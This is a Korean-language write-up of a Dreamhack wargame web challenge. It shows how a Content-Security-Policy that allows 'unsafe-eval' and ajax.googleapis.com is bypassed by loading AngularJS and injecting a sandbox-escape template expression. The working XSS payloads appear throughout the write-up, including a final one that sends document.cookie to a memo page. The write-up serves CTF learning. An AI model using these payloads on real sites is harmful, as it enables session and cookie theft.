created: 2026-02-11 17:34
category: #web 
link: https://dreamhack.io/wargame/challenges/437

# Write-up
```python
@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'nonce-{nonce}' 'unsafe-eval' https://ajax.googleapis.com; object-src 'none'"
    nonce = os.urandom(16).hex()
    return response
```
- 문제 코드의 CSP 정책을 보면 위와 같다. `script-src` 부분이 취약점으로 의심되었는데, 왜냐하면 기존에 보지 못했던 `unsafe-eval`과 `https://ajax.googleapis.com` 옵션이 추가로 있었기 때문이다.
- `https://ajax.googleapis.com`을 허용하기 때문에 jqeury나 angularjs 같은 모듈을 로드할 수 있다. 
- 또한 `unsafe-eval`로 인해 AngularJS가 `{{...}}` 표현식을 해석하는 데 차질이 없을 것이다. 

`http://host3.dreamhack.games:10639/vuln?param=<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>`
- 우선 위와 같이 `/vuln` 페이지에 AngularJS를 로드하는 `<script>` 태그를 넣어보았다. 콘솔 창에서 확인한 결과 CSP 위반 경고가 뜨지 않았다. 

`ng-app`이라는 AngularJS의 디렉터리가 있는데, 이는 HTML에서 어느 부분을 AngularJS가 제어할지 결정한다. 따라서 이 디렉터리가 선언된 범위 안에서 `{{표현식}}`을 AngularJS가 직접 해석하여 실행할 수 있다. 
이를 이용하여 alert 테스트 먼저 진행하고자 한다. 

`http://host3.dreamhack.games:10639/vuln?param=<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><div ng-app>{{alert(1)}}</div>`
- 하지만, 위와 같이 `/vuln` 페이지에서 테스트하여도 alert 팝업이 뜨지 않는다. 
- 찾아보니 이는 AngularJS의 샌드박스 시스템 때문이라고 한다. 이를 우회하기 위한 기법을 찾아서 적용하기로 했다.

`http://host3.dreamhack.games:10639/vuln?param=<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>`
- AngularJS 샌드박스 우회 기법을 적용하였고 이제 alert 팝업까지 뜨는 것을 확인하였다. (근데 두 번씩 뜸)
- 이제 남은 것은 플래그를 획득하는 것이다.

`<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><div ng-app>{{constructor.constructor('location.href="/memo?memo="+document.cookie')()}}</div>`
- `/flag` 페이지에서 위 코드를 입력해주었고 정상적으로 플래그를 획득할 수 있었다.

# Reference
- https://www.hahwul.com/blog/2017/web-hacking-angularjs-sandboxdom-based/
- https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection
- https://docs.angularjs.org/guide/expression
- https://docs.angularjs.org/guide/directive
- https://developer.mozilla.org/ko/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src
- https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Global_Objects/eval